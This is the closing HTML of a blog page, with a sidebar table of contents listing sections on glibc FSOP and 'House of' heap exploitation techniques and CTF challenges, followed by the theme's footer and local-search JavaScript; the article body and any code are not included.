      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/wechat.jpg"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">66</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">45</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
                  </li>
                
              </ul>
            </div>
          

          <div class="wechat_OA">
    <br>
    <span>Welcome to my wechat</span>
    <p></p>
    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
</div>

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#IO%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">IO基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-number">2.</span> <span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-23%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">2.23版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-24%E7%89%88%E6%9C%AC%E4%B9%8B%E5%90%8E"><span class="nav-number">2.2.</span> <span class="nav-text">2.24版本之后</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-str-jumps"><span class="nav-number">2.2.1.</span> <span class="nav-text">利用_IO_str_jumps</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wstr-jumps"><span class="nav-number">2.2.2.</span> <span class="nav-text">利用_IO_wstr_jumps</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Kiwi"><span class="nav-number">3.</span> <span class="nav-text">House_Of_Kiwi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NULL-FxCK"><span class="nav-number">3.2.</span> <span class="nav-text">NULL_FxCK</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Pig"><span class="nav-number">4.</span> <span class="nav-text">House_Of_Pig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eznote-DSCTF2022"><span class="nav-number">4.2.</span> <span class="nav-text">eznote(DSCTF2022)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple2"><span class="nav-number">5.</span> <span class="nav-text">House_Of_Apple2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">利用原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-overflow%E5%87%BD%E6%95%B0"><span class="nav-number">5.1.1.</span> <span class="nav-text">利用_IO_wfile_overflow函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0"><span class="nav-number">5.1.2.</span> <span class="nav-text">利用_IO_wfile_underflow_mmap函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-cat-%E5%BC%BA%E7%BD%912022"><span class="nav-number">5.2.</span> <span class="nav-text">house_of_cat(强网2022)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Apple3"><span class="nav-number">6.</span> <span class="nav-text">House_Of_Apple3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-3"><span class="nav-number">6.1.</span> <span class="nav-text">利用原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Cat"><span class="nav-number">7.</span> <span class="nav-text">House_Of_Cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-4"><span class="nav-number">7.1.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-cat-%E5%BC%BA%E7%BD%912022-1"><span class="nav-number">7.2.</span> <span class="nav-text">house_of_cat(强网2022)</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>

  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Pursue</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
